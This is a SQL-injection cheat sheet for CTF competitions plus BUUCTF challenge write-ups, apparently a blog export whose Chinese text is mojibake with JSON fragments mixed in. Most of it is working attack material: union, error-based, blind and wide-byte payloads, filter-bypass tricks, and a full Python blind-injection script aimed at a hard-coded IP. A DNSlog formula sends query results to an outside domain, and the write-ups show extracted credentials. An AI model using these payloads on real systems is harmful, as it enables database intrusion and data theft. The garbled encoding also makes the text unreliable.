†ï¼Œç°åœ¨æ•´åˆä¸€ä¸‹ï¼Œåšä¸ªå¤‡å¿˜å½•ï¼Œæ–¹ä¾¿æ¯”èµ›çš„æ—¶å€™æ–¹ä¾¿æŸ¥è¯¢ã€‚ å…¸ä¸­å…¸ç‰ˆæœ¬:çˆ†åº“ç‰ˆæœ¬: ?id=-1' union select 1,database(),3--+çˆ†åº“: ?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+çˆ†è¡¨: ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='æ•°æ®åº“'#çˆ†å­—æ®µ: ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='æ•°æ®è¡¨'#è¿™å‡ ä¸ªå‡ºæ¥äº†ï¼Œå‰©ä¸‹çš„å°±ä¸ç”¨æˆ‘è¯´äº†å§qwq å¸¸ç”¨å‡½æ•°: åç§° ä½œç”¨ system_user() ç³»ç»Ÿç”¨æˆ·å user() ç”¨æˆ·å session_user() è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å database() æ•°æ®åº“å version() MYSQLæ•°æ®åº“ç‰ˆæœ¬ load_file() MYSQLè¯»å–æœ¬åœ°æ–‡ä»¶çš„å‡½æ•° @@datadir è¯»å–æ•°æ®åº“è·¯å¾„ @@basedir MYSQL å®‰è£…è·¯å¾„ @@version_compile_os æ“ä½œç³»ç»Ÿ æŠ¥é”™æ³¨å…¥:extractvalueå‡½æ•°éƒ½ä¼šï¼Œä¸è§£é‡Šäº†ã€‚å…¬å¼:extractvalue(æ•°å­—,concat(0x7e,(æŸ¥è¯¢è¯­å¥),0x7e)) updatexmlå‡½æ•°éƒ½ä¼šï¼Œä¸è§£é‡Šäº†ã€‚å…¬å¼:updatexml(æ•°å­—,concat(0x7e,(æŸ¥è¯¢è¯­å¥),0x7e),æ•°å­—) æº¢å‡ºæŠ¥é”™expå‡½æ•°æº¢å‡º | mysql&gt;5.5.53åŸç†:å½“ä¼ é€’ä¸€ä¸ªå¤§äº 709 çš„å€¼æ—¶ï¼Œå‡½æ•° exp() å°±ä¼šå¼•èµ·ä¸€ä¸ªæº¢å‡ºé”™è¯¯,ç”¨ ~ è¿ç®—ç¬¦æŒ‰ä½å–åçš„æ–¹å¼å¾—åˆ°ä¸€ä¸ªæœ€å¤§å€¼ï¼Œè¯¥è¿ç®—ç¬¦ä¹Ÿå¯ä»¥å¤„ç†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»è¿‡å…¶å¤„ç†çš„å­—ç¬¦ä¸²ä¼šå˜æˆå¤§ä¸€ä¸ªå¾ˆå¤§æ•´æ•°è¶³ä»¥è¶…è¿‡ MySQL çš„ Double æ•°ç»„èŒƒå›´ï¼Œä»è€ŒæŠ¥é”™è¾“å‡ºã€‚ 1234567891011mysql&gt; select ~(select version());+----------------------+| ~(select version()) |+----------------------+| 18446744073709551610 |+----------------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select exp(~(select * from(select version())x));ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.44-0ubuntu0.14.04.1' from dual)))'mysql&gt; å…¬å¼:select exp(~(select * from(æŸ¥è¯¢è¯­å¥)x));æ”¯æŒload_file,æœ€å¤š13è¡Œ BIGINTæº¢å‡ºå·®ä¸å¤šåŒæ ·çš„åŸç†ï¼Œå¯ä»¥æŠ¥é”™å…¬å¼:select 1+~(select*from(æŸ¥è¯¢è¯­å¥)x);åŒç†ï¼Œå…¶ä»–çš„å‡½æ•°ä¹Ÿå¯ä»¥è¿™ä¹ˆå¹²: 123select !atan((select*from(æŸ¥è¯¢è¯­å¥)a))-~0;select !ceil((select*from(æŸ¥è¯¢è¯­å¥)a))-~0;select !floor((select*from(æŸ¥è¯¢è¯­å¥)a))-~0; å…¶ä»–èƒ½åˆ©ç”¨çš„å‡½æ•°â€¦ 12345678910111213HEXINFLOORCEILRANDCEILINGTRUNCATETANSQRTROUNDSIGNEXP... group by æ³¨å…¥ | è¡¨ä¸­çš„æ•°æ®è‡³å°‘è¦ä¸ºä¸‰æ¡æ‰å¯ä»¥æ³¨å…¥æˆåŠŸåŸç†:group_byæ³¨å…¥ å…¬å¼:select count(*) from information_schema.tables group by concat((æŸ¥è¯¢è¯­å¥),floor(rand()*2));æ•ˆç‡æ¯”è¾ƒä½qwqè€Œä¸”è¿˜æœ‰çŒœé”™çš„å¯èƒ½ æ— selectæ³¨å…¥ | MySQL 8æµ…è°ˆåˆ©ç”¨mysql8æ–°ç‰¹æ€§è¿›è¡ŒSQLæ³¨å…¥è„šæœ¬æ¬åˆ°è¿™é‡Œäº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203'''@author qwzf@desc æœ¬è„šæœ¬æ˜¯ç”¨äºmysql 8æ–°ç‰¹æ€§çš„sqlæ³¨å…¥@date 2021/02/18'''import requestsimport stringurl = 'http://121.41.231.75:8002/Less-8/?id='chars=string.ascii_letters+string.digits+&quot;@{}_-?&quot;def current_db(url): print(&quot;åˆ©ç”¨mysql8æ–°ç‰¹æ€§æˆ–æ™®é€šå¸ƒå°”ç›²æ³¨:\\n1.æ–°ç‰¹æ€§(è”åˆæŸ¥è¯¢) 2.æ™®é€šå¸ƒå°”ç›²æ³¨&quot;) print(&quot;è¯·è¾“å…¥åºå·:&quot;,end='') num = int(input()) if num == 1: payload = &quot;-1' union values row(1,database(),3)--+&quot; #è”åˆæŸ¥è¯¢çˆ†å½“å‰æ•°æ®åº“(å¯ä¿®æ”¹) urls = url + payload r = requests.get(url=urls) print(r.text) else: name='' payload = &quot;1' and ascii(substr((database()),{0},1))={1}--+&quot; #å¸ƒå°”ç›²æ³¨çˆ†å½“å‰æ•°æ®åº“(å¯ä¿®æ”¹) for i in range(1,40): char='' for j in chars: payloads = payload.format(i,ord(j)) urls = url + payloads r = requests.get(url=urls) if &quot;You are in&quot; in r.text: name += j print(name) char = j break if char == '': breakdef str2hex(name): res = '' for i in name: res += hex(ord(i)) res = '0x' + res.replace('0x','') return resdef dbs(url): #æ— åˆ—åç›²æ³¨çˆ†æ‰€æœ‰æ•°æ®åº“(å¯ä¿®æ”¹) while True: print(&quot;è¯·è¾“å…¥è¦çˆ†ç¬¬å‡ ä¸ªæ•°æ®åº“ï¼Œå¦‚ï¼š1,2ç­‰:&quot;,end='') x = int(input())-1 num = str(x) if x &lt; 0: break payload = &quot;1' and ('def',{},'',4,5,6)&gt;(table information_schema.schemata limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef tables_n(url,database): #æ— åˆ—åç›²æ³¨çˆ†æ•°æ®è¡¨å¼€å§‹è¡Œæ•°(å¯ä¿®æ”¹) payload = &quot;1' and ('def','&quot;+database+&quot;','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit {},1)--+&quot; for i in range(0,10000): payloads = payload.format(i) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: char = chr(ord(database[-1])+1) database = database[0:-1]+char payld = &quot;1' and ('def','&quot;+database+&quot;','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;+str(i)+&quot;,1)--+&quot; urls = url + payld res = requests.get(url=urls) #print(i) if 'You are in' not in res.text: print('ä»ç¬¬',i,'è¡Œå¼€å§‹çˆ†æ•°æ®è¡¨') #åˆ¤æ–­å¼€å§‹è¡Œæ•° n = i break return ndef tables(url,database,n): #æ— åˆ—åç›²æ³¨çˆ†æ•°æ®è¡¨(å¯ä¿®æ”¹) while True: print(&quot;è¯·è¾“å…¥è¦çˆ†ç¬¬å‡ ä¸ªæ•°æ®è¡¨ï¼Œå¦‚ï¼š1,2ç­‰:&quot;,end='') x = int(input())-1 num = str(x + n) if x &lt; 0: break payload = &quot;1' and ('def','&quot;+database+&quot;',{},'',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef columns_n(url,database,table): #æ— åˆ—åç›²æ³¨çˆ†å­—æ®µå¼€å§‹è¡Œæ•°(å¯ä¿®æ”¹) payload = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit {},1)--+&quot; for i in range(3000,10000): payloads = payload.format(i) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: char = chr(ord(table[-1])+1) table = table[0:-1]+char payld = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;+str(i)+&quot;,1)--+&quot; urls = url + payld res = requests.get(url=urls) #print(i) if 'You are in' not in res.text: print('ä»ç¬¬',i,'è¡Œå¼€å§‹çˆ†å­—æ®µ') #åˆ¤æ–­å¼€å§‹è¡Œæ•° n = i break return ndef columns(url,database,table,n): #æ— åˆ—åç›²æ³¨çˆ†å­—æ®µå€¼(å¯ä¿®æ”¹) while True: print(&quot;è¯·è¾“å…¥è¦çˆ†ç¬¬å‡ ä¸ªå­—æ®µï¼Œå¦‚ï¼š1,2ç­‰:&quot;,end='') x = int(input())-1 num = str(x + n) if x &lt; 0: break payload = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;',{},'',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef datas(url,table): #æ— åˆ—åç›²æ³¨çˆ†æ•°æ®(å¯ä¿®æ”¹) while True: print(&quot;è¯·è¾“å…¥è¦çˆ†ç¬¬å‡ ä¸ªæ•°æ®ï¼Œå¦‚ï¼š1,2ç­‰:&quot;,end='') x = int(input()) y = x-1 num = str(y) if y &lt; 0: break payload = &quot;1' and (&quot;+str(x)+&quot;,{},'')&gt;(table &quot;+table+&quot; limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakif __name__ == &quot;__main__&quot;: while True: print(&quot;è¯·è¾“å…¥è¦æ“ä½œçš„å†…å®¹ï¼š\\n1.çˆ†å½“å‰æ•°æ®åº“\\n2.çˆ†æ•°æ®è¡¨å¼€å§‹è¡Œå·\\n3.çˆ†æ•°æ®è¡¨\\n4.çˆ†å­—æ®µå€¼å¼€å§‹è¡Œå·\\n5.çˆ†å­—æ®µå€¼\\n6.çˆ†æ•°æ®\\n7.çˆ†æ‰€æœ‰æ•°æ®åº“&quot;) types = int(input()) if types == 1: current_db(url) elif types == 2 or types == 3: print(&quot;è¯·è¾“å…¥å·²ç»å¾—åˆ°çš„æ•°æ®åº“å:&quot;,end='') database = input() if types == 2: tables_n(url,database) elif types == 3: print(&quot;çˆ†æ•°æ®è¡¨å¼€å§‹è¡Œå·:&quot;,end='') n = int(input()) tables(url,database,n) elif types == 4 or types == 5: print(&quot;è¯·è¾“å…¥å·²ç»å¾—åˆ°çš„æ•°æ®åº“å:&quot;,end='') database = input() print(&quot;è¯·è¾“å…¥å·²ç»å¾—åˆ°çš„æ•°æ®è¡¨å:&quot;,end='') table = input() if types == 4: columns_n(url,database,table) elif types == 5: print(&quot;çˆ†å­—æ®µå€¼å¼€å§‹è¡Œå·:&quot;,end='') n = int(input()) columns(url,database,table,n) elif types == 6: print(&quot;è¯·è¾“å…¥è¦æŸ¥è¯¢çš„æ•°æ®è¡¨å:&quot;,end='') table = input() datas(url,table) else: dbs(url) æ—¶é—´ç›²æ³¨åŸç†éƒ½ä¼šï¼Œä¸è®²äº†ã€‚ asciiåˆ¤æ–­:if(ascii(substr(æŸ¥è¯¢è¯­å¥,1,1))&gt;115,1,sleep(3))leftè¯­å¥åˆ¤æ–­:if(left(æŸ¥è¯¢è¯­å¥,1)='s',sleep(10),1) if(left(æŸ¥è¯¢è¯­å¥,2)='sa',sleep(10),1)substringå‡½æ•°åˆ¤æ–­:if(substring((æŸ¥è¯¢è¯­å¥),1,1='a'),11111,sleep(1)) å¸ƒå°”æ³¨å…¥åŒæ—¶é—´ç›²æ³¨ï¼Œæ²¡å•¥ä¸œè¥¿ äºŒæ¬¡æ³¨å…¥ä¹Ÿæ²¡å•¥å¤ªå¤šæ´»èƒ½æ•´ï¼Œå¯ä»¥ä½¿ç”¨flaskæ¡†æ¶æœ¬åœ°ä¸­è½¬ä¸€ä¸‹ï¼ŒæŠŠç¹ççš„æ­¥éª¤äº¤ç»™æœºå™¨åšã€‚ å †å æ³¨å…¥èƒ½åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œè¦æ±‚æ¯”è¾ƒé«˜ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨é¢„ç¼–è¯‘äº†ã€‚å¯ä»¥å‚è€ƒè¿™é¢˜æ•´èŠ±æ´»**[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨**BUUCTF[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ çš„ä¸‰ç§è§£æ³• Dnslogæ³¨å…¥è¦æ±‚mysqlæƒé™æ¯”è¾ƒé«˜ï¼ŒåŒæ—¶è¿˜å¾—èƒ½å‡ºç½‘å…¬å¼:select load_file(concat('\\\\',(æŸ¥è¯¢è¯­å¥),'.DNSLOGç»™çš„åŸŸå/ä»»æ„å­—ç¬¦' æœç´¢æ³¨å…¥åŸç†:mysqlæŸ¥è¯¢çš„æ—¶å€™ï¼Œå¸¸ç”¨çš„æ˜¯select * from sqltest where names like '%è¦æŸ¥è¯¢çš„å…³é”®å­—%è¿™æ—¶å€™å°±å¯ä»¥é—­åˆ%ç„¶åæ³¨å…¥ å®½å­—èŠ‚æ³¨å…¥ |ä½¿ç”¨äº†addslashes()å‡½æ•° &amp;&amp; æ•°æ®åº“è®¾ç½®äº†ç¼–ç æ¨¡å¼ä¸ºGBKåŸç†: å‰ç«¯è¾“å…¥%dfæ—¶ï¼Œé¦–å…ˆç»è¿‡addslashes()è½¬ä¹‰å˜æˆ%df%5c%27ï¼Œä¹‹åï¼Œåœ¨æ•°æ®åº“æŸ¥è¯¢å‰ï¼Œå› ä¸ºè®¾ç½®äº†GBKç¼–ç ï¼ŒGBKç¼–ç åœ¨æ±‰å­—ç¼–ç èŒƒå›´å†…çš„ä¸¤ä¸ªå­—èŠ‚éƒ½ä¼šé‡æ–°ç¼–ç æˆä¸€ä¸ªæ±‰å­—ã€‚ç„¶åmysqlæœåŠ¡å™¨ä¼šå¯¹æŸ¥è¯¢çš„è¯­å¥è¿›è¡ŒGBKç¼–ç ï¼Œ%df%5cç¼–ç æˆäº†â€œè¿â€ï¼Œè€Œå•å¼•å·é€ƒé€¸äº†å‡ºæ¥ï¼Œå½¢æˆäº†æ³¨å…¥æ¼æ´ã€‚ 12345?id=%df' and 1=1 --+?id=%df' and 1=2 --+?id=-1%df' union select 1,2,3 %23 limitæ³¨å…¥ | æ•°æ®åº“ç‰ˆæœ¬æ¯”è¾ƒä½åŸç†:Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•å…¬å¼:SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,æŸ¥è¯¢è¯­å¥)),1); Bypassç©ºæ ¼ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨Tabä»£æ›¿ç©ºæ ¼ï¼Œ%a0=ç©ºæ ¼,æ‹¬å·ä»£æ›¿ç©ºæ ¼,æ³¨é‡Š/*æ³¨é‡Š*/ å¼•å· | åå…­è¿›åˆ¶è¿™ä¸ªæ—¶å€™å¦‚æœå¼•å·è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆä¸Šé¢çš„whereå­å¥å°±æ— æ³•ä½¿ç”¨äº†ã€‚é‚£ä¹ˆé‡åˆ°è¿™æ ·çš„é—®é¢˜å°±è¦ä½¿ç”¨åå…­è¿›åˆ¶æ¥å¤„ç†è¿™ä¸ªé—®é¢˜äº†ã€‚usersçš„åå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²æ˜¯7573657273ã€‚é‚£ä¹ˆæœ€åçš„sqlè¯­å¥å°±å˜ä¸ºäº†ï¼š select column_name from information_schema.tables where table_name=0x7573657273 é€—å·åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åˆ°substr(),mid(),limitã€‚è¿™äº›å­å¥æ–¹æ³•éƒ½éœ€è¦ä½¿ç”¨åˆ°é€—å·ã€‚å¯¹äºsubstr()å’Œmid()è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨from toçš„æ–¹å¼æ¥è§£å†³ï¼š select substr(database() from 1 for 1); select mid(database() from 1 for 1); ä½¿ç”¨joinï¼š union select 1,2# ç­‰ä»·äº union select * from (select 1)a join (select 2)b ä½¿ç”¨like: select ascii(mid(user(),1,1))=80 # ç­‰ä»·äº select user() like 'r%' å¯¹äºlimitå¯ä»¥ä½¿ç”¨offsetæ¥ç»•è¿‡ï¼š select * from news limit 0,1 # ç­‰ä»·äºä¸‹é¢è¿™æ¡SQLè¯­å¥ select * from news limit 1 offset 0 ç»•è¿‡æ¯”è¾ƒç¬¦å·()ï¼ˆè¿‡æ»¤äº†&lt;&gt;ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨&lt;&gt;ï¼Œä½¿ç”¨betweençš„è„šæœ¬ï¼‰ï¼š ä½¿ç”¨greatest()ã€leastï¼ˆï¼‰ï¼šï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰ åŒæ ·æ˜¯åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œåœ¨ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°æ¯”è¾ƒæ“ä½œç¬¦æ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚å¦‚æœæ— æ³•ä½¿ç”¨æ¯”è¾ƒæ“ä½œç¬¦ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ°greatestæ¥è¿›è¡Œç»•è¿‡äº†ã€‚ æœ€å¸¸è§çš„ä¸€ä¸ªç›²æ³¨çš„sqlè¯­å¥ï¼š select * from users where id=1 and ascii(substr(database(),0,1))&gt;64 æ­¤æ—¶å¦‚æœæ¯”è¾ƒæ“ä½œç¬¦è¢«è¿‡æ»¤ï¼Œä¸Šé¢çš„ç›²æ³¨è¯­å¥åˆ™æ— æ³•ä½¿ç”¨,é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨greatestæ¥ä»£æ›¿æ¯”è¾ƒæ“ä½œç¬¦äº†ã€‚greatest(n1,n2,n3,â€¦)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1,n2,n3,â€¦)çš„æœ€å¤§å€¼ã€‚ é‚£ä¹ˆä¸Šé¢çš„è¿™æ¡sqlè¯­å¥å¯ä»¥ä½¿ç”¨greatestå˜ä¸ºå¦‚ä¸‹çš„å­å¥: select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 Betweenæ³¨å…¥ä¸»è¦ç”¨äºç›²æ³¨çœ‹é¡µé¢æ˜¯å¦æœ‰å˜åŒ–ï¼ŒåŸç†å¦‚ä¸‹ï¼Œä¾‹å¦‚usernameçš„å­—ç¬¦å†…å®¹æ˜¯test1ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯tï¼Œaåˆ°bæœç´¢ä¸äº†ï¼Œé¡µé¢ä¸æ­£å¸¸ã€‚ aåˆ°tå°±æœ‰äº†ï¼Œé¡µé¢æ­£å¸¸ æ³¨between 1 and 1; ç­‰ä»·äº =1 WHEREå¯ä»¥ä½¿ç”¨having ,ä½†æ˜¯havingåªèƒ½ç”¨å‰é¢selectå·²ç»é€‰æ‹©çš„åˆ—å 12select goods_price,goods_name from sw_goods where goods_price &gt; 100select goods_price,goods_name from sw_goods having goods_price &gt; 100 è¿‡æ»¤information_schemaå¯ä»¥æŸ¥è¡¨å: InnoDbå¼•æ“ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚åªéœ€è¦æŠŠinfromation_schemaæ¢æˆmysql.innodb_table_stats sysæ•°æ®åº“åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ªinformation_schemaå’Œperformance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„schema_auto_increment_columnsæ¥è·å–è¡¨åã€‚åªéœ€è¦æŠŠinformation_schemaæ¢æˆsys.schema_auto_increment_columnså°±è¡Œäº†ï¼Œå…¶ä»–çš„å®Œå…¨ä¸€æ · ä¹‹åå°±éœ€è¦æ— åˆ—åæ³¨å…¥äº† SLEEPç¡ä¸äº†ï¼Ÿå°±æƒ³åŠæ³•è®©sqlå¹²é‡æ´»æ…¢ä¸‹æ¥concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b' or and xor notç»•è¿‡ï¼šand=&amp;&amp; or=|| xor=| not=! ç»•è¿‡æ³¨é‡Šç¬¦ï¼ˆ#ï¼Œâ€“(åé¢è·Ÿä¸€ä¸ªç©ºæ ¼ï¼‰ï¼‰è¿‡æ»¤ï¼š id=1' union select 1,2,3||'1 æœ€åçš„or â€˜1é—­åˆæŸ¥è¯¢è¯­å¥çš„æœ€åçš„å•å¼•å·ï¼Œæˆ–è€…ï¼š id=1' union select 1,2,'3 ç»•è¿‡ç­‰äºå·ä½¿ç”¨like ã€rlike ã€regexp æˆ–è€… ä½¿ç”¨&lt; æˆ–è€… &gt; å…¶ä»–çš„bypassæ‰‹æ®µ:è¿™ä¸ªå°±çœ‹é¢˜ç›®ç¯å¢ƒäº†ï¼Œé¢˜ç›®é‡Œéšæœºå¤šæ ·ï¼Œä½†æ˜¯ä¸‡å˜ä¸ç¦»å…¶å®—ã€‚ Sqlmapç§‘æŠ€æœªå®Œå¾…ç»­ ç›¸å…³é“¾æ¥:Sqlié€šå…³flaskæ¡†æ¶expå‡½æ•°æº¢å‡ºæ³¨å…¥MySQLæ³¨å…¥æŒ‡åŒ—group_byæ³¨å…¥group_byæŠ¥é”™æ³¨å…¥BIGINTæŠ¥é”™æ³¨å…¥SQLæ³¨å…¥å…³è”åˆ†ææµ…è°ˆåˆ©ç”¨mysql8æ–°ç‰¹æ€§è¿›è¡ŒSQLæ³¨å…¥SQLæ³¨å…¥ä¹‹æ— åˆ—åæ³¨å…¥","link":"/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"BUUåšé¢˜å¯„å½•","text":"[suctf 2019]EasySQL | sql_modesql æ³¨å…¥ ä¹ä¸€è¯•ï¼Œå¯ä»¥å †å  çœ‹æ ·å­æœ‰è¿‡æ»¤,ç®€å•æµ‹äº†ä¸€ä¸‹ï¼Œè¿‡æ»¤äº†from,information é»‘åå• 1$BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;; æŸ¥è¯¢è¯­å¥ 1select $_GET['query'] || flag from flag è„‘æ´:1234payload1: *,1payload2: 0;set sql_mode=PIPES_AS_CONCAT;select 0è®©sqlæŠŠ || å½“ä½œæ‹¼æ¥ [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ | å †å ï¼Œæ— select é¢„ç¼–è¯‘ä¸Šæ¥å°±æŠŠé»‘åå•ä¸€æ‘†ï¼Œå¥½åƒå·²ç»æ— æ‡ˆå¯å‡»äº† 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); æµ‹è¯•ä¸€ä¸‹ï¼Œå­—ç¬¦å½¢ åŒå¼•å·emmm,å•¥éƒ½ä¸ä¼šäº†ï¼Œåªèƒ½çœ‹çœ‹wpäº† mysqlé‡Œé¢ï¼Œçˆ†å­—æ®µå¹¶ä¸ä¸€å®šéœ€è¦information_schemaè¿™ä¸ªåº“ 12345678910mysql&gt; show columns from users;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(20) | NO | | NULL | || password | varchar(20) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+3 rows in set (0.00 sec) å—¯å“¼~how å‘½ä»¤æŸ¥çœ‹è¡¨ä¸­çš„ã€Œå­—æ®µã€ï¼Œæ³¨æ„è¡¨åè¦ç”¨åå¼•å·åŒ…è£¹æœ‰ç”¨ é™„: MySQLä¸“æœ‰æ— selectå¯ç”¨MySQL é™¤äº†å¯ä»¥ä½¿ç”¨ select æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨ handler è¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handler è¯­å¥å¹¶ä¸å…·å¤‡ select è¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯ MySQL ä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚handler è¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äº MyISAM å’Œ InnoDB è¡¨ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨é¢„ç¼–è¯‘è½¬æ¢æˆhexç»•è¿‡ [SUCTF 2019]EasySQLå–œæfuzzè„šæœ¬ 12345678910import requests url = &quot;http://7e692c90-6f0b-4aa3-babf-89bb436f6b4f.node4.buuoj.cn:81/&quot;with open('sql-fuzz.txt') as f: for line in f: data = {&quot;query&quot;: line} r = requests.post(url,data=data) if('Nonono' in r.text): print(line.strip(),end=&quot; &quot;) çº¯ç›²æ³¨äº†ï¼Œå•¥éƒ½çœ‹ä¸è§ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰è¿™é¢˜çš„ç”»é£æ˜¯é‚£ä¹ˆçš„ä¼¼æ›¾ç›¸è¯†â€¦.. 1;set sql_mode=PIPES_AS_CONCAT;select 1 æ·¦ï¼Œä¸Šä¸€é¢˜ä¸€æ¨¡ä¸€æ ·çš„payload [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQLæŠ¥é”™æ³¨å…¥ http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin' and updatexml(0x7e,concat(0x7e,database()),0x7e) %23&amp;password=adminâ€™ and sleep(3) è¡¨å: 12geekuser: id,username,password geekåº“l0ve1ysq1: id,username,password geekåº“ admin824fc00cd6f8cd94403b365a80bcfbd cl4ywo_tai_nan_le glzjinglzjin_wants_a_girlfriend Z4cHAr7zCrbiao_ge_dddd_hm æŠ¥é”™æ³¨å…¥ï¼Œç¡¬çˆ† 123http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin' and updatexml(1,concat(0x7e,(select substr((select password from l0ve1ysq1 where username='flag'),30,16)),0x7e),1) %23&amp;password=admin' and sleep(3) 